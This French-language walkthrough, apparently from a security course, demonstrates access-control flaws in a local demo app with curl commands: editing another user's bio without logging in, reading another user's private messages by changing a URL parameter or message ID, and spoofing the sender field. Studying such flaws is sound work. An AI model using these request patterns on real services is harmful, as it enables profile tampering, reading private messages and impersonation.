# Exploit par Ève

Dans cette application, on s'attend à ce que:
- Seul l'utilisateur "bob" puisse modifier son profil
- Tout le monde puisse voir les profils des autres utilisateurs

Si on arrive à modifier le profil de "bob" sans être connecté en tant que "bob", nous avons alors un exploit sur le contrôle d'accès.

## Contexte:

Bob s'est inscrit et a défini sa bio et son orientation.

```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c bob-cookie.txt \
    -d '{
      "nomUtilisateur": "bob",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/profil/bio \
    -H "Content-Type: application/json" \
    -b bob-cookie.txt \
    -d '{
      "nomUtilisateur": "bob",
      "bio": "Je suis Bob, j'\''aime cuisiner et prendre des marches."
    }' ;
curl -X POST http://localhost:8080/api/profil/orientation \
    -H "Content-Type: application/json" \
    -b bob-cookie.txt \
    -d '{
      "nomUtilisateur": "bob",
      "orientation": "hommes"
    }'
```

## Exploit:
1. Lister tous les profils pour trouver le nom d'utilisateur de Bob
```bash
curl -X GET http://localhost:8080/api/profils/hommes
```
2. Modifier la bio de Bob sans être connecté en tant que Bob
```bash
curl -X POST http://localhost:8080/api/profil/bio \
    -H "Content-Type: application/json" \
    -d '{
      "nomUtilisateur": "bob",
      "bio": "Je suis Bob, je suis responsable pour les pires saloperies de l'\''univers."
    }'
```
3. Vérifier que la bio de Bob a été modifiée
```bash
curl -X GET http://localhost:8080/api/profile/bob
```

On a réussi à modifier la bio de Bob sans connaître son mot de passe.

On demande un compte MAIS on utilise pas ce compte pour valider qui est
la personne qui fait la requête.  

---

## Exploit sur les messages privés

### Contexte:

Alice et Bob se sont inscrits et Alice a envoyé un message privé à Bob.

```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c alice-cookie.txt \
    -d '{
      "nomUtilisateur": "alice",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c bob-cookie.txt \
    -d '{
      "nomUtilisateur": "bob",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -b alice-cookie.txt \
    -d '{
      "expediteur": "alice",
      "destinataire": "bob",
      "contenu": "Salut Bob, on se voit ce soir au resto?"
    }'
```

Ève s'inscrit aussi :
```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c eve-cookie.txt \
    -d '{
      "nomUtilisateur": "eve",
      "motDePasse": "password123"
    }'
```

### Exploit:

Le système exige une session valide (JSESSIONID) mais fait confiance au
paramètre de la requête pour déterminer *qui* fait la demande.

1. Ève lit la boîte de réception de Bob en changeant le paramètre URL
```bash
curl -X GET "http://localhost:8080/api/messages?utilisateur=bob" \
    -b eve-cookie.txt
```
→ Ève est connectée avec son propre cookie, mais le serveur retourne les messages de Bob.

2. Ève lit un message privé par son ID
```bash
curl -X GET http://localhost:8080/api/messages/1 \
    -b eve-cookie.txt
```
→ Le message privé Alice→Bob est retourné sans vérification.

3. Ève envoie un message en se faisant passer pour Alice
```bash
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -b eve-cookie.txt \
    -d '{
      "expediteur": "alice",
      "destinataire": "bob",
      "contenu": "Faux message envoyé par Ève en se faisant passer pour Alice"
    }'
```
→ Le cookie d'Ève prouve qu'elle est connectée, mais le champ `expediteur`
dans le body est pris tel quel. Bob reçoit un message qui semble venir d'Alice.

L'application vérifie qu'on est *quelqu'un* (authentification) mais ne vérifie
pas qu'on est *la bonne personne* pour l'action demandée.

